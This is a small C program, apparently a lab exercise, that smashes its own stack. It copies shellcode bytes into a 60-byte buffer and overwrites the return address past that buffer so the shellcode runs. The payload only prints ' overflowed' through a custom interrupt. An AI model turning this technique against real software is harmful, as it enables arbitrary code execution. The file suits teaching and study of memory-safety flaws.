#include "stdio.h"
#include "string.h"

unsigned char payload[] = {
    0x60, 0xeb, 0x0d, 0x5a, 0x31, 0xc0, 0xcd, 0x90,
    0x61, 0xbb, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xfe,
    0xe8, 0xee, 0xff, 0xff, 0xff, 0x20, 0x6f, 0x76,
    0x65, 0x72, 0x66, 0x6c, 0x6f, 0x77, 0x65, 0x64,
    0x0a, 0x00
};
int *p;
int i;
void attack() {
    unsigned char buf[60];
    p = &buf[60];
    for (i = 0; i < 34; i++) {
        buf[i] = payload[i];
    }
    for (i = 0; i < 16; i++) {
        p[i] = buf;
    }
}

int main(int argc, char *argv[]) {
    attack();
    return 0;
}